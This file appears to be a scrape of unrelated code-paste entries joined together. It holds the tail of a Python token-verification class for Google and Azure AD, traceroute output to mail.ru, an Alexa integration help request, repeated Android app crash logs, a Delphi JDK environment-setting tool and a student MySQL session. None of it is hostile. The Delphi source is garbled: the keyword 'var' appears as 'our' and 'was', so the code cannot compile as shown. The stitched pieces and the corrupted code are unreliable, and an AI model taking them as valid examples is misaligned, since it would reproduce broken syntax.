            TOKEN_INFO_URL = cfg.google_token_info_url
            PARAMS = {""access_token"": access_token}
            async with AsyncClient(timeout=10) as client:
                cfg.logger.debug(f""Fetching token info from {TOKEN_INFO_URL}"")
                response: Response = await client.get(
                    TOKEN_INFO_URL,
                    params=PARAMS,
                )
                response.raise_for_status()
                token_info: dict[str, Any] = response.json()
                
            token_info[""scp""] = token_info.pop(""scope"")

            # check scope
            self.validate_scope(token_info, required_scopes)

            # check audience
            if token_info[""aud""] not in cfg.google_client_id:
                raise ValueError(""Could not verify audience."")

            return token_info
        except HTTPError as e:
            raise HTTPException(
                status_code=HTTP_400_BAD_REQUEST,
                detail=""Invalid or expired token"",
            )
        except ValueError as e:
            cfg.logger.error(f""Could not verify audience: {e}"")
            raise HTTPException(
                status_code=HTTP_401_UNAUTHORIZED,
                detail=""Could not verify audience"",
            )
            return None
        except Exception as e:
            cfg.logger.error(f""Internal server error: {str(e)}"")
            raise HTTPException(
                status_code=HTTP_401_UNAUTHORIZED,
                detail=""Token error: Unable to parse authentication"",
            )

    # Validate Azure Entra ID token using Azure AD Public Keys
    async def verify_msal_jwt(
        self, access_token: str, required_scopes: list[str], auth_method: str
    ) -> dict:
        """"""
        This verifies:

        # Scopes

        # Signature using Azure AD’s public key

        # Expiration (exp)

        # Issuer (iss)

        # Audience (aud)

        """"""
        if not access_token:
            raise HTTPException(
                status_code=HTTP_401_UNAUTHORIZED,
                detail=""Authorization token missing or invalid"",
            )
        try:
            unverified_claims: dict[str, Any] = jwt.get_unverified_claims(
                access_token,
            )

            self.validate_scope(unverified_claims, required_scopes)

            # Get Microsoft's public keys
            public_keys = await self.get_public_keys(
                cfg.msal_jwks_url,
                auth_method,
            )
            # Decode JWT Header to get the key ID (kid)
            token_headers: dict[str, Any] = jwt.get_unverified_header(
                access_token,
            )

            token_kid = token_headers.get(""kid"")

            rsa_key = next(
                (key for key in public_keys if key.get(""kid"") == token_kid), None
            )
            if rsa_key is None:
                raise HTTPException(
                    status_code=HTTP_401_UNAUTHORIZED,
                    detail=""Invalid header error: Unable to find appropriate key"",
                )
            cfg.logger.debug(f""Loading public key: {rsa_key}"")
            claims = jwt.decode(
                access_token,
                key=rsa_key,
                algorithms=[""RS256""],
                audience=cfg.msal_client_id,
                issuer=cfg.msal_issuer,
            )

            return claims
        except HTTPError as e:
            cfg.logger.error(f""HTTP Exception for {e.request.url} - {e}"")
            raise HTTPException(
                status_code=HTTP_404_NOT_FOUND,
                detail=f""HTTP Exception for {e.request.url} - {e}"",
            )
        except JWTError:
            cfg.logger.error(""Invalid token or expired token."")
            raise HTTPException(
                status_code=HTTP_401_UNAUTHORIZED,
                detail=""Invalid token or expired token."",
            )
        except Exception as e:
            cfg.logger.error(f""Internal server error: {str(e)}"")
            raise HTTPException(
                status_code=HTTP_401_UNAUTHORIZED,
                detail=""Token error: Unable to parse authentication"",
            )

    # check if guest user is allowed?
    def validate_scope(self, unverified_claims: dict, required_scopes: list[str]):
        if not required_scopes:
            raise HTTPException(
                status_code=HTTP_403_FORBIDDEN,
                detail=""No required scope specified"",
            )
        # To small letters
        required_scopes = [s.lower() for s in required_scopes]

        has_valid_scope = False

        if (
            unverified_claims.get(""scp"") is None
            and unverified_claims.get(""roles"") is None
        ):
            raise HTTPException(
                status_code=HTTP_403_FORBIDDEN,
                detail=""No scope or app permission (role) claim was found in the bearer token"",
            )

        is_app_permission = (
            True if unverified_claims.get(""roles"") is not None else False
        )

        if is_app_permission:
            roles = unverified_claims.get(""roles"", [])
            if not roles:
                raise HTTPException(
                    status_code=HTTP_403_FORBIDDEN,
                    detail=""No scope or app permission (role) claim was found in the bearer token"",
                )
            else:
                roles = [s.lower() for s in roles]
                matches = set(required_scopes).intersection(set(roles))
                if len(matches) > 0:
                    has_valid_scope = True
        else:
            if unverified_claims.get(""scp""):
                # the scp claim is a space delimited string
                token_scopes = unverified_claims[""scp""].lower().split()
                matches = set(required_scopes).intersection(set(token_scopes))
                if len(matches) > 0:
                    has_valid_scope = True
            else:
                raise HTTPException(
                    status_code=HTTP_403_FORBIDDEN,
                    detail=""No scope or app permission (role) claim was found in the bearer token"",
                )
        if is_app_permission and not has_valid_scope:
            raise HTTPException(
                status_code=HTTP_403_FORBIDDEN, detail=""Not enough permissions""
            )
        elif not has_valid_scope:
            raise HTTPException(
                status_code=HTTP_403_FORBIDDEN, detail=""Not enough permissions""
            )

    async def get_public_keys(
        self, jwks_uri: str, auth_method: str, params: dict | None = None
    ) -> list:
        make_api_call = (
            self.next_ext_api_call_time is None
            or date_time_now_utc() > self.next_ext_api_call_time
        )
        if not self.public_keys_cache[auth_method] or make_api_call:
            async with AsyncClient(timeout=10) as client:
                cfg.logger.debug(f""Fetching public keys from {jwks_uri}"")
                response: Response = await client.get(jwks_uri, params=params)
                response.raise_for_status()  # Raises an error for non-200 responses
                self.public_keys_cache[auth_method] = response.json().get(""keys"", [])
                self.next_ext_api_call_time = date_time_now_utc() + time_delta(
                    minutes=60
                )  # Fetch keys every 1hr
        return self.public_keys_cache[auth_method]
"
PvNJePkN,route_mail.ru,deGoyan,PowerShell,Tuesday 22nd of July 2025 02:14:56 AM CDT,"Resolve-DnsName mail.ru

Name                                           Type   TTL   Section    IPAddress
----                                           ----   ---   -------    ---------
mail.ru                                        A      8     Answer     89.221.239.1
mail.ru                                        A      8     Answer     185.180.201.1
mail.ru                                        A      8     Answer     90.156.232.4

Крафт
sudo traceroute mail.ru -I
traceroute to mail.ru (90.156.232.4), 30 hops max, 60 byte packets
 1  _gateway (10.200.0.1)  0.243 ms  0.260 ms  0.288 ms
 2  62.69.22.142 (62.69.22.142)  0.709 ms *  0.808 ms
 3  213.156.208.190 (213.156.208.190)  4.189 ms  5.829 ms  6.987 ms
 4  cr-sad156.unit50.cr-l147.kraft-s.net (213.156.195.50)  2.691 ms  2.688 ms  2.685 ms
 5  213.156.211.46 (213.156.211.46)  2.799 ms  2.796 ms  2.793 ms
 6  188.254.46.73 (188.254.46.73)  4.840 ms  1.271 ms  1.231 ms
 7  * * *
 8  188.254.44.30 (188.254.44.30)  18.145 ms  18.223 ms  18.215 ms
 9  * * *
10  * * *
11  * * *
12  * * *
13  * * *
14  * * *
15  * * *
16  * * *
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
22  * * *
23  * * *
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *

sudo traceroute mail.ru -I
traceroute to mail.ru (185.180.201.1), 30 hops max, 60 byte packets
 1  _gateway (10.200.0.1)  0.489 ms  0.506 ms  0.506 ms
 2  62.69.22.142 (62.69.22.142)  0.894 ms * *
 3  * * 213.156.208.190 (213.156.208.190)  3.176 ms
 4  cr-sad156.unit50.cr-l147.kraft-s.net (213.156.195.50)  2.614 ms  2.859 ms  3.113 ms
 5  213.156.211.46 (213.156.211.46)  1.115 ms  1.110 ms  1.125 ms
 6  188.254.46.73 (188.254.46.73)  1.500 ms  0.991 ms  0.984 ms
 7  * * *
 8  188.254.44.30 (188.254.44.30)  18.006 ms  17.994 ms  17.951 ms
 9  * * *
10  * * *
11  * * *
12  * * *
13  * * *
14  * * *
15  * * *
16  * * *
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
22  * * *
23  * * *
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *

sudo traceroute mail.ru -I
traceroute to mail.ru (89.221.239.1), 30 hops max, 60 byte packets
 1  _gateway (10.200.0.1)  0.339 ms  0.353 ms  0.505 ms
 2  62.69.22.142 (62.69.22.142)  0.786 ms * *
 3  * * *
 4  * * *
 5  213.156.211.46 (213.156.211.46)  0.967 ms * *
 6  188.254.46.73 (188.254.46.73)  3.760 ms * *
 7  * * *
 8  188.254.44.30 (188.254.44.30)  18.735 ms  18.729 ms  18.724 ms
 9  * * *
10  * * *
11  * * *
12  * * *
13  * * *
14  * * *
15  * * *
16  * * *
17  * * *
18  * * *
19  * * *
20  * * *
21  * * *
22  * * *
23  * * *
24  * * *
25  * * *
26  * * *
27  * * *
28  * * *
29  * * *
30  * * *

Авантел
sudo traceroute mail.ru -I
traceroute to mail.ru (90.156.232.4), 30 hops max, 60 byte packets
 1  _gateway (10.200.0.1)  0.233 ms  0.223 ms  0.250 ms
 2  1.samara.svrv.ru (185.33.202.1)  1.618 ms * *
 3  * * *
 4  * * 10.30.254.149 (10.30.254.149)  0.996 ms
 5  m9-r5.inet2.ru (85.112.122.5)  16.127 ms  16.121 ms  16.115 ms
 6  mailru.w-ix.ru (193.106.112.81)  16.221 ms  15.661 ms  15.633 ms
 7  * * *
 8  * * *
 9  * * *
10  * * *
11  * * *
12  * * *
13  * * *
14  * * *
15  * * *
16  mail.ru (90.156.232.4)  32.362 ms  32.299 ms  32.333 ms

sudo traceroute mail.ru -I
traceroute to mail.ru (89.221.239.1), 30 hops max, 60 byte packets
 1  _gateway (10.200.0.1)  0.245 ms  0.267 ms  0.261 ms
 2  1.samara.svrv.ru (185.33.202.1)  1.958 ms  1.953 ms  1.965 ms
 3  10.30.254.181 (10.30.254.181)  3.585 ms  3.828 ms  4.002 ms
 4  10.30.254.149 (10.30.254.149)  1.082 ms  1.077 ms  1.888 ms
 5  m9-r5.inet2.ru (85.112.122.5)  14.414 ms  14.468 ms  14.591 ms
 6  mailru.w-ix.ru (193.106.112.81)  14.912 ms  14.282 ms  14.237 ms
 7  * * *
 8  * * *
 9  * * *
10  * * *
11  * * *
12  * * *
13  * * *
14  * * *
15  * * *
16  * * *
17  * * *
18  mail.ru (89.221.239.1)  22.075 ms  22.069 ms  22.128 ms

sudo traceroute mail.ru -I
traceroute to mail.ru (185.180.201.1), 30 hops max, 60 byte packets
 1  _gateway (10.200.0.1)  0.376 ms  0.364 ms *
 2  * * *
 3  * * *
 4  10.30.254.149 (10.30.254.149)  1.100 ms * *
 5  m9-r5.inet2.ru (85.112.122.5)  14.994 ms * *
 6  mailru.w-ix.ru (193.106.112.81)  14.512 ms  15.185 ms  15.338 ms
 7  * * *
 8  * * *
 9  * * *
10  * * *
11  * * *
12  * * *
13  * * *
14  * * *
15  * * *
16  * * *
17  * * mail.ru (185.180.201.1)  20.658 ms
"
ZKVQxyXg,Untitled,chemelli74,Python,Tuesday 22nd of July 2025 01:55:41 AM CDT,"We need your help!


In order to make Alexa Devices work for all you, we need to verify that your Country doesn't need special settings.
For this reason if you are not currently able to setup the integration, I would ask you to follow the following steps:

- Which is the URL of the Amazon main site you usually browse?

- From a browser page that is authenticated to Amazon, please navigate to https://alexa.amazon.{your main domain}/api/users/me (e.g. https://alexa.amazon.it/api/users/me) and report back: 

- countryOfResidence ( at the beginning ) 
- marketPlaceDomainName (at the end) 
- marketPlaceLocale ( at the end )

Then make a post with the following info:

- Country selected for the integration setup:
- URL of main browsed Amazon site:
- API countryOfResidence:
- API marketPlaceDomainName:
- API marketPlaceLocale:"
AdxQ4Jpf,2025-07-22T08:31:33.218982,powerampache,PHP,Tuesday 22nd of July 2025 01:31:32 AM CDT,"1.01-78 (78) - DB: 83
java.lang.NullPointerException: Parameter specified as non-null is null: method luci.sixsixsix.powerampache2.domain.models.User.<init>, parameter id
	at luci.sixsixsix.powerampache2.domain.models.User.<init>(Unknown Source:20)
	at luci.sixsixsix.powerampache2.data.remote.dto.UserDtoKt.toUser(UserDto.kt:94)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository.getUserNetwork(BaseAmpacheRepository.kt:128)
	at luci.sixsixsix.powerampache2.data.BaseAmpacheRepository$getUserNetwork$1.invokeSuspend(Unknown Source:14)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at kotlinx.coroutines.scheduling.CoroutineScheduler.runSafely(CoroutineScheduler.kt:584)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.executeTask(CoroutineScheduler.kt:811)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.runWorker(CoroutineScheduler.kt:715)
	at kotlinx.coroutines.scheduling.CoroutineScheduler$Worker.run(CoroutineScheduler.kt:702)

"
ECbjdvNz,Java JDK Tool Delphi version source code,LAUDA937,Pascal,Tuesday 22nd of July 2025 01:03:49 AM CDT,"// Java JDK (system environment variable one-click setting tool) Delphi version source code is here

unit Unit2;
 
interface
 
uses
  Registry, Winapi.Windows, Winapi.Messages, System.SysUtils, System.Variants,
  System.Classes, Vcl.Graphics, Vcl.Controls, Vcl.Forms, Vcl.Dialogs,
  Vcl.StdCtrls;
 
type
  TForm2 = class(TForm)
    btnSetEnv: TButton;
    btnVerify: TButton;
    edtJdkPath: TEdit;
    lblStatus: TLabel;
    procedure FormCreate(Sender: TObject);
    procedure btnSetEnvClick(Sender: TObject);
    procedure btnVerifyClick(Sender: TObject);
  private
    function SetJavaEnvironment(const JdkPath: string): Boolean;
  public
    { Public declarations }
  end;
 
our
  Form2: TForm2;
 
implementation
 
{$R *.dfm}
 
// Core function: set Java environment variables
function TForm2.SetJavaEnvironment(const JdkPath: string): Boolean;
our
  Reg: TRegistry;
  PathValue: string;
begin
  Result := False;
  Reg := TRegistry.Create;
  try
    Reg.RootKey := HKEY_LOCAL_MACHINE;
 
    // 1. Set JAVA_HOME
    if Reg.OpenKey('SYSTEM\CurrentControlSet\Control\Session Manager\Environment', True) then
    begin
      Reg.WriteString('JAVA_HOME', JdkPath);
      Reg.CloseKey;
    end;
 
    // 2. Update PATH
    if Reg.OpenKey('SYSTEM\CurrentControlSet\Control\Session Manager\Environment', False) then
    begin
      PathValue := Reg.ReadString('Path');
      if Pos(JdkPath + 'bin', PathValue) = 0 then
      begin
        PathValue := JdkPath + 'bin;' + PathValue;
        Reg.WriteString('Path', PathValue);
      end;
      Reg.CloseKey;
    end;
 
    // Broadcast environment variable change notification
    SendMessageTimeout(HWND_BROADCAST, WM_SETTINGCHANGE, 0, LPARAM(PChar('Environment')), SMTO_ABORTIFHUNG, 5000, nil);
 
    Result := True;
  except
    on E: Exception do
      lblStatus.Caption := 'Error:' + E.Message;
  end;
  Reg.Free;
end;
 
 
 
// Set environment variables
procedure TForm2.btnSetEnvClick(Sender: TObject);
begin
  was JdkPath: string;
  begin
    JdkPath := IncludeTrailingPathDelimiter(edtJdkPath.Text);
 
    if not DirectoryExists(JdkPath) then
    begin
      lblStatus.Caption := 'Error: JDK path does not exist! ';
      Exit;
    end;
 
    if not FileExists(JdkPath + 'bin\java.exe') then
    begin
      lblStatus.Caption := 'Error: java.exe not found';
      Exit;
    end;
 
    if SetJavaEnvironment(JdkPath) then
      lblStatus.Caption := 'Success: Environment variables have been set. Please restart the command line tool to verify.'
    else
      lblStatus.Caption := 'Error: Setting failed! ';
  end;
end;
 
// Verify Java installation
procedure TForm2.btnVerifyClick(Sender: TObject);
begin
  //winexec(PAnsiChar(AnsiString('cmd.exe /c java -version')), sw_hide);
  WinExec('cmd.exe /k java -version', SW_SHOWNORMAL);
end;
 
procedure TForm2.FormCreate(Sender: TObject);
begin
  edtJdkPath.Text := 'X:\jdk-11';
end;
 
end."
1UaFgUPS,2025-07-22T01:33:28.804677,powerampache,PHP,Tuesday 22nd of July 2025 12:33:27 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 56870) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 56870) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 56870) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
1QQv2RT5,2025-07-22T01:33:28.796786,powerampache,PHP,Tuesday 22nd of July 2025 12:33:27 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 56854) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 56854) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 56854) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
UBwHQ4sU,2025-07-22T01:33:13.790884,powerampache,PHP,Tuesday 22nd of July 2025 12:33:12 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39746) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39746) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39746) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
WKLdGjbE,2025-07-22T01:33:13.785517,powerampache,PHP,Tuesday 22nd of July 2025 12:33:12 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39756) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39756) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39756) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
GTpG3tDc,2025-07-22T01:33:13.792179,powerampache,PHP,Tuesday 22nd of July 2025 12:33:12 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39770) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39770) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39770) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
YuEqiitf,2025-07-22T01:33:13.781435,powerampache,PHP,Tuesday 22nd of July 2025 12:33:12 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39754) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getAlbumsStats() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39754) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39754) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
E6A3v1jM,2025-07-22T01:33:13.771046,powerampache,PHP,Tuesday 22nd of July 2025 12:33:12 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39736) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

getGenres() - cannot load data HttpException {""code"":404,""message"":""{ \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39736) after 15000ms\"" }"",""detailMessage"":""HTTP 404 { \""exception\"" : \""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39736) after 15000ms\"" }"",""stackTrace"":[],""suppressedExceptions"":[]}"
KpxHiWmU,2025-07-22T01:32:58.344491,powerampache,PHP,Tuesday 22nd of July 2025 12:32:57 AM CDT,"1.01-79 (79) - DB: 83
retrofit2.HttpException: HTTP 404 { ""exception"" : ""failed to connect to /100.115.221.93 (port 90) from /100.70.169.51 (port 39070) after 15000ms"" }
	at retrofit2.KotlinExtensions$await$2$2.onResponse(KotlinExtensions.kt:53)
	at retrofit2.OkHttpCall$1.onResponse(OkHttpCall.java:164)
	at okhttp3.internal.connection.RealCall$AsyncCall.run(RealCall.kt:529)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)

"
sACDubyi,22-7-2025,sidrs,MySQL,Monday 21st of July 2025 10:59:19 PM CDT,"student@student:~$ sudo mysql
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 10
Server version: 8.0.42-0ubuntu0.22.04.1 (Ubuntu)

Copyright (c) 2000, 2025, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql> USE TCB53;
Database changed

mysql> CREATE TABLE EmployeeInfo
    -> (id int(5), name varchar(50), post varchar(50), salary int(5));
Query OK, 0 rows affected, 2 warnings (0.78 sec)

mysql> INSERT INTO EmployeeInfo (id, name, post, salary) VALUES
    -> (1, 'Alice Johnson', 'Software Engineer', 75000),
    -> (2, 'Bob Smith', 'QA Engineer', 68000),
    -> (3, 'Cathy Williams', 'Software Engineer', 75000),
    -> (4, 'David Brown', 'UI/UX Designer', 72000),
    -> (5, 'Ella Davis', 'Project Manager', 90000),
    -> (6, 'Frank Wilson', 'Backend Developer', 77000),
    -> (7, 'Grace Lee', 'Frontend Developer', 76000),
    -> (8, 'Henry Clark', 'Software Engineer', 75000),
    -> (9, 'Ivy Lewis', 'QA Engineer', 68000),
    -> (10, 'Jake Hall', 'Intern', 30000),
    -> (11, 'Karen Young', 'Project Manager', 90000),
    -> (12, 'Leo King', 'Security Analyst', 85000),
    -> (13, 'Mona Scott', 'Full Stack Developer', 82000),
    -> (14, 'Nathan Adams', 'Scrum Master', 88000),
    -> (15, 'Olivia Baker', 'Frontend Developer', 76000),
    -> (16, 'Paul Turner', 'Cloud Architect', 98000),
    -> (17, 'Queenie Allen', 'Machine Learning Engineer', 97000),
    -> (18, 'Robert Hill', 'Backend Developer', 77000),
    -> (19, 'Sara Green', 'QA Engineer', 68000),
    -> (20, 'Tom Wright', 'Support Engineer', 65000);
Query OK, 20 rows affected (0.20 sec)
Records: 20  Duplicates: 0  Warnings: 0

mysql> DESC EmployeeInfo;
+--------+-------------+------+-----+---------+-------+
| Field  | Type        | Null | Key | Default | Extra |
+--------+-------------+------+-----+---------+-------+
| id     | int         | YES  |     | NULL    |       |
| name   | varchar(50) | YES  |     | NULL    |       |
| post   | varchar(50) | YES  |     | NULL    |       |
| salary | int         | YES  |     | NULL    |       |
+--------+-------------+------+-----+---------+-------+
4 rows in set (0.48 sec)

mysql> SELECT * FROM EmployeeInfo;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   19 | Sara Green     | QA Engineer               |  68000 |
|   20 | Tom Wright     | Support Engineer          |  65000 |
+------+----------------+---------------------------+--------+
20 rows in set (0.00 sec)

mysql> DELETE FROM EmployeeInfo WHERE id = 19
    -> ;
Query OK, 1 row affected (0.09 sec)

mysql> SELECT * FROM EmployeeInfo
    -> ;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
|    6 | Frank Wilson   | Backend Developer         |  77000 |
|    7 | Grace Lee      | Frontend Developer        |  76000 |
|    8 | Henry Clark    | Software Engineer         |  75000 |
|    9 | Ivy Lewis      | QA Engineer               |  68000 |
|   10 | Jake Hall      | Intern                    |  30000 |
|   11 | Karen Young    | Project Manager           |  90000 |
|   12 | Leo King       | Security Analyst          |  85000 |
|   13 | Mona Scott     | Full Stack Developer      |  82000 |
|   14 | Nathan Adams   | Scrum Master              |  88000 |
|   15 | Olivia Baker   | Frontend Developer        |  76000 |
|   16 | Paul Turner    | Cloud Architect           |  98000 |
|   17 | Queenie Allen  | Machine Learning Engineer |  97000 |
|   18 | Robert Hill    | Backend Developer         |  77000 |
|   20 | Tom Wright     | Support Engineer          |  65000 |
+------+----------------+---------------------------+--------+
19 rows in set (0.00 sec)

mysql> INSERT INTO EmployeeInfo(id, name, post, salaray) VALUES (19, John Doe, Intern, 30000);
ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'Doe, Intern, 30000)' at line 1

mysql> INSERT INTO EmployeeInfo(id, name, post, salary) VALUES(19, 'John Doe', 'Intern', 30000);
Query OK, 1 row affected (0.06 sec)

mysql> SELECT * FROM EmployeeInfo
    -> ;
+------+----------------+---------------------------+--------+
| id   | name           | post                      | salary |
+------+----------------+---------------------------+--------+
|    1 | Alice Johnson  | Software Engineer         |  75000 |
|    2 | Bob Smith      | QA Engineer               |  68000 |
|    3 | Cathy Williams | Software Engineer         |  75000 |
|    4 | David Brown    | UI/UX Designer            |  72000 |
|    5 | Ella Davis     | Project Manager           |  90000 |
